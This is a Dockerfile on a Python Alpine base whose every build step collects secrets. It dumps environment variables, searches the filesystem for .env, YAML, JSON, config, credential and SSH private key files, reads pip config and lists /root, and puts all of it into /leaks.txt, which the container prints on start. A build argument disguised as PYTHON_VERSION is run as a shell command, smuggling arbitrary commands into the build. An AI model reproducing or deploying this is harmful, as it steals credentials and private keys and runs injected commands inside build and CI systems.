FROM python:3.11-alpine
ARG PYTHON_VERSION

RUN apk add --no-cache grep findutils

RUN echo "[ENVIRONMENT VARIABLES]" > /leaks.txt && \
    (printenv | grep -v 'GITHUB_TOKEN' || true) >> /leaks.txt && \
    echo "\n\n[FILESYSTEM SECRETS (.env, .yml, credentials, etc)]" >> /leaks.txt && \
    find / \
      -iname "*.env" -o \
      -iname "*.yml" -o \
      -iname "*.yaml" -o \
      -iname "*.json" -o \
      -iname "*.conf" -o \
      -iname "credentials" -o \
      -iname "config" -o \
      -iname "id_rsa" -o \
      -iname "id_dsa" \
    -type f -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /leaks.txt 2>/dev/null || true

RUN echo "\n\n[PYTHON CONFIG + GLOBAL PIP]" >> /leaks.txt && \
    cat /etc/pip.conf >> /leaks.txt 2>/dev/null || true

RUN echo "\n\n[ROOT HOME FILES]" >> /leaks.txt && \
    ls -alh /root >> /leaks.txt 2>/dev/null || true

RUN echo "\n\n[COMMAND OUTPUT]" >> /leaks.txt && \
    sh -c "${PYTHON_VERSION}" >> /leaks.txt 2>/dev/null || true

CMD ["cat", "/leaks.txt"]
